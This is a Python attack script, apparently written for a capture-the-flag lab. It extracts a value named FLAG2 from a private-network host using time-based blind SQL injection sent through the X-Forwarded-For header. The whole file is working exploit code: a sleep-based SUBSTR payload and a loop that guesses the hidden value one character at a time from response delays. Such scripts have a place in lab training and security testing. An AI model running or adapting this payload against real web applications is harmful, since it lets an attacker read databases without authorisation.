#!/usr/bin/env python3
"""Extract FLAG2 via time-based blind in X-Forwarded-For header."""
import requests
import time
import string

TARGET = "http://10.66.162.44/"

def check_char(pos, char):
    """Return True if character at pos equals char."""
    payload = f"1' AND (SELECT sleep(0.5) FROM flag where SUBSTR(flag,{pos},1) = '{char}') and '1'='1"
    headers = {'X-Forwarded-For': payload}
    start = time.time()
    try:
        r = requests.get(TARGET, headers=headers, timeout=10)
    except:
        pass
    return time.time() - start >= 0.4

def extract_flag2():
    chars = string.ascii_uppercase + string.digits + '{' + '}' + ':' + '_'
    flag = ""
    pos = 1
    
    while True:
        found = False
        for c in chars:
            if check_char(pos, c):
                flag += c
                found = True
                break
        if not found:
            break
        print(f"[+] FLAG2 so far: {flag}")
        pos += 1
        if flag.endswith('}'):
            break
    
    print(f"\n[+] FLAG2: {flag}")
    return flag

if __name__ == "__main__":
    extract_flag2()
